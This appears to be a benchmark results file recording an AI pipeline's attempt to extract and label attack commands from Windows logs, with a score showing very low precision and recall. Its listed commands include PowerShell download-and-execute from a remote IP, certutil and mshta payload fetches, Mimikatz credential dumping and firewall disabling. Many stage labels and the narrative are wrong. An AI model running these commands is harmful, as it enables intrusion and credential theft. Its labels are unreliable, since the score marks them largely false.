@@ -1,0 +1,243 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\u0103\\u017du4\\u0107\\u012b\\u030f\\u0259...",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powercfg.exe -h off",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \"domain admins\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "CertUtil -UrlCache -Split -F Http://124.223.85.207:8082/test.hta Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": ".\\chromeRemoteServices.ps1",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -Decode -f http://124.223.85.207:8082/a.txt b.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\WINDOWS\\system32\\cmd.exe /C Netsh Advfirewall show allprofiles &  NetSh Advfirewall?set?allprofiles state off & echo ????????& pause",
+        "stage": "Execution"
+      },
+      {
+        "command": "taskkill.exe /f /IM WordPad.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\windows\\system32\\cmd.exe atbroker.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "start /min sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1548.002 -TestNumbers 2\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"]\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "mimikatz2.exe lsadump::SAM exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "netsh interface portproxy add v4tov4 listenPort=65535 connectAddress=127.0.0.1 connectPort=22 listenAddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "tor.lnk",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"mkdir timestomp ; echo ipconfig /all > timestomp/timestomp.txt ; (ls timestomp).LastWriteTime=??????`???????",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "netsh interface PortProxy Add V4ToV4 ListenPort=65535 ConnectAddress=127.0.0.1 ConnectPort=80 ListenAddress=127.0.0.1 Protocol=TCP",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "rmsupport.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "rundll32.exe user32.dll, LockWorkStation",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "mimikatz.exe LSADUMP::DCSync Exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net.exe LOCALGROUP",
+        "stage": "Discovery"
+      },
+      {
+        "command": "notepad.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "net session",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net.exe SESSION",
+        "stage": "Discovery"
+      },
+      {
+        "command": "schtasks.exe /query",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net config workstation",
+        "stage": "Discovery"
+      },
+      {
+        "command": "schtasks.exe /Query",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy RemotingRestricted -C \"[Reflection.Assembly]::LoadWithPartialName(\"Microsoft.VisualBasic\")\", & {([Microsoft.VisualBasic.Fragments.FileIO.FileSystem]::DeleteDirectory(\"C:\\\\Users\\\\Administrator\\\\Desktop\\\\shell\\\\T1059.006.py\"));}",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "PowerCfg.exe -h Off",
+        "stage": "Persistence"
+      },
+      {
+        "command": "certutil.exe -IsPublish",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil.exe -getreg CAStore",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil.exe -addstore certificate",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Set-itemproperty -path registry:hklm\\software\\microsoft\\window\\\ncurrentversion\\policies\\system -value 0 0\" ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "TASKKILL.EXE /IM TASKLIST.EXE",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "net stop w32time",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net stop w32tm",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net share",
+        "stage": "Discovery"
+      }
+    ],
+    "narrative": "This multi-stage attack began with initial access through various means involving PowerShell scripts downloaded from an unknown server. Notable events include the use of non-standard binary files like `rmsupport.exe`, as well as the exploitation of vulnerabilities such as `T1059.006`. The attacker also attempted to obfuscate their actions using techniques like Unicode encoding and deleting logs. They utilized various tools like Mimikatz, PsImage, and AtomicRedTeam, while trying to evade detection by modifying the system registry, stopping services, and creating new processes. Overall, this appears to be a sophisticated attack campaign designed to gather information and maintain persistence.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 87854,
+      "completion_tokens": 8223,
+      "total_tokens": 96077,
+      "wall_clock_s": 112.622,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0625,
+      "recall": 0.125,
+      "f1": 0.08333333333333333,
+      "tp": 3,
+      "fp": 45,
+      "fn": 21
+    },
+    "stage": {
+      "precision": 0.041666666666666664,
+      "recall": 0.08695652173913043,
+      "f1": 0.056338028169014086,
+      "tp": 2,
+      "fp": 46,
+      "fn": 21,
+      "recall_partial": 0.08695652173913043
+    },
+    "hallucination_rate": 0.24324324324324326,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 87854,
+      "completion_tokens": 8223,
+      "total_tokens": 96077,
+      "wall_clock_s": 112.622,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
